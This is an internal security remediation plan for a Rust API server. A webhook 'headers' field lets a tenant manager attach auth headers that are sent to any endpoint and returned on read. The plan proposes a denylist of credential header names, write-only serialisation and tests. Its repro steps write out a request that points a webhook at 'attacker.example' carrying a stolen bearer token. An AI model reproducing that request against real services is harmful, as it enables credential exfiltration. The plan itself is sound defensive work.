# security-webhook-subscription-headers-auth-smuggling

**Vector:** security
**Score:** 3
**Source:** PR #3332 body — "Still open" item 2
**Confidence:** high

## Hypothesis
The `EnhancedWebhookSubscription.headers` field is a free-form `Option<serde_json::Value>` (`backend/crates/db/src/models/api_ecosystem.rs:407`): any tenant-admin with the manager role can write arbitrary HTTP header names, including `Authorization`, `Cookie`, `X-API-Key`, and `X-Auth-Token`. When the webhook delivery worker reads those headers back and attaches them to the outbound POST, a malicious manager can exfiltrate tokens stolen from logs or credentials embedded in a payload template to any attacker-controlled endpoint — one webhook subscription becomes a persistent SSRF-cum-exfil channel. The fix rejects known auth header names on write and omits the field from the read-response schema so a stolen token can't be redistributed through the API either.

## Evidence
- `backend/crates/db/src/models/api_ecosystem.rs:407` — `EnhancedWebhookSubscription.headers: Option<serde_json::Value>` with no `#[serde(skip_serializing)]` — the field is sent back in the list / get responses.
- `backend/crates/db/src/models/api_ecosystem.rs:429,448` — `CreateEnhancedWebhookSubscription.headers` and `UpdateEnhancedWebhookSubscription.headers` accept any JSON — no header-name allowlist / denylist on write.
- PR #3332 body — Still open #2: "`EnhancedWebhookSubscription.headers` can carry auth headers" — the Round-5 authz pass explicitly deferred this item.
- `backend/servers/api-server/src/routes/api_ecosystem.rs:1015-1055` — create + update handlers accept the model without filtering headers.
- Compare `backend/crates/db/src/models/api_ecosystem.rs:401-402` — `auth_config` uses `#[serde(skip_serializing)]` + a doc comment stating "Write-only: never sent to API clients". The same treatment should apply to `headers` (plus a write-time denylist).

## Files
- `backend/crates/db/src/models/api_ecosystem.rs:407`
- `backend/crates/db/src/models/api_ecosystem.rs:429`
- `backend/crates/db/src/models/api_ecosystem.rs:448`
- `backend/servers/api-server/src/routes/api_ecosystem.rs:1015`
- `backend/servers/api-server/src/routes/api_ecosystem.rs:1054`

## Dependencies
<!-- no dependencies — can land independently -->

## Required capabilities
- [x] C1 — Systematic debugging (security-vector requires it)
- [ ] C2 — Seed data
- [x] C3 — Dev instance running (to spin up the integration test)
- [ ] C4 — Browser
- [ ] C5 — ADB device
- [x] C6 — Verification before completion
- [ ] C7 — Code-review reception

Mode: cloud-ok

## Repro steps
1. Spin up api-server with a manager JWT for org A.
2. `POST /api/v1/ecosystem/webhook-subscriptions` with body `{"name":"exfil","url":"https://attacker.example","auth_type":"none","events":["*"],"headers":{"Authorization":"Bearer stolen-token","X-Api-Key":"abc"}}`.
3. Expected (after fix): 400 `INVALID_HEADER_NAME` listing the rejected header names. Observed (before fix): 200 with the subscription id returned.
4. `GET /api/v1/ecosystem/webhook-subscriptions/<id>` — expected (after fix): `headers` field absent from the response body. Observed (before fix): the Authorization header round-trips verbatim in the response.

## Suggested approach
1. Introduce `backend/crates/db/src/models/api_ecosystem.rs` module-level constant: `const FORBIDDEN_HEADER_NAMES: &[&str] = &["authorization", "cookie", "x-api-key", "x-auth-token", "proxy-authorization", "x-forwarded-authorization"];` (lowercase, trimmed match).
2. Add `impl CreateEnhancedWebhookSubscription { pub fn validate_headers(&self) -> Result<(), ValidationError> }` that iterates the JSON object keys (if `headers` is `Some(Value::Object(map))`) and rejects any key whose lowercase match hits `FORBIDDEN_HEADER_NAMES`; duplicate for `UpdateEnhancedWebhookSubscription`.
3. `backend/servers/api-server/src/routes/api_ecosystem.rs:1015` — call `request.validate_headers()?` before persistence; map the error to `StatusCode::BAD_REQUEST` + `ErrorResponse::new("INVALID_HEADER_NAME", "<comma-separated rejected names>")`.
4. `backend/crates/db/src/models/api_ecosystem.rs:407` — add `#[serde(skip_serializing)]` to `EnhancedWebhookSubscription.headers`, and a doc comment matching `auth_config`'s: "Write-only: never sent to API clients nor listed in the response schema."
5. Optional belt-and-braces: at outbound-delivery time, re-strip the forbidden names from the stored headers before building the reqwest::Client HeaderMap — catches rows written before the migration.
6. Add migration or one-off cleanup script if deemed necessary (survey production rows for pre-existing auth headers in a separate PR — out of scope here).
7. Update the OpenAPI spec consumers via the generator rebuild (api-client + reality-api-client).

## Alternatives considered
- **Allowlist approach** (only permit a known-safe header set like `X-Custom-*`) — rejected because the existing feature surface permits arbitrary webhook integrations that legitimately use custom header names; a denylist of known-auth headers is the minimum change that closes the exfil without breaking existing integrations.
- **Full header-field removal** (drop the `headers` column entirely) — rejected because custom non-auth headers are a legitimate webhook feature (e.g. tracing-id, routing-tags); dropping the column would break existing integrations.

## Root-cause trace
1. Symptom: tenant manager writes an `Authorization`-class header name with a stolen bearer value into webhook headers; the next delivery sends the header to the attacker endpoint. Schema also returns the header back on GET.
2. ← `EnhancedWebhookSubscription.headers` at `backend/crates/db/src/models/api_ecosystem.rs:407` has no `#[serde(skip_serializing)]` and no write-time validation.
3. ← The sibling `auth_config` field got the correct treatment at line 400-402 (write-only with doc comment); `headers` was added in the same model but overlooked.
4. Origin: the `headers` field was added in the enhanced-webhook surface expansion (pre-October 2026); the Round-5 pass in PR #3332 identified the gap but deferred it to a dedicated PR.

## Test plan
- [ ] `backend/servers/api-server/tests/suites/webhook_headers_auth_smuggling_tests.rs` — new integration test: create + update subscription with each of the 6 forbidden names; assert 400 with the rejected names in the body.
- [ ] Same test file — GET the subscription after a successful create (with legitimate non-auth headers); assert the response JSON has no `headers` key.
- [ ] `cargo test -j 1 -p api-server --test suite_7 webhook_headers_auth_smuggling_tests` locally.
- [ ] `check-rls-enforcement.sh --strict` (should remain clean).

## Out of scope
- Historical row cleanup (pre-existing rows that already carry an auth header value) — handle in a follow-up migration.
- Outbound-delivery stripping belt-and-braces — track as a separate backlog row if the migration lands.
- Other free-form JSON header fields on sibling models (`portal_webhooks`, `voice_webhooks`) — survey separately.

## After-merge
- Move this file to `plans/_archive/security-webhook-subscription-headers-auth-smuggling.md`.
- Mark the matching `backlog.json` row `security-webhook-subscription-headers-auth-smuggling` as `status: "done"`.
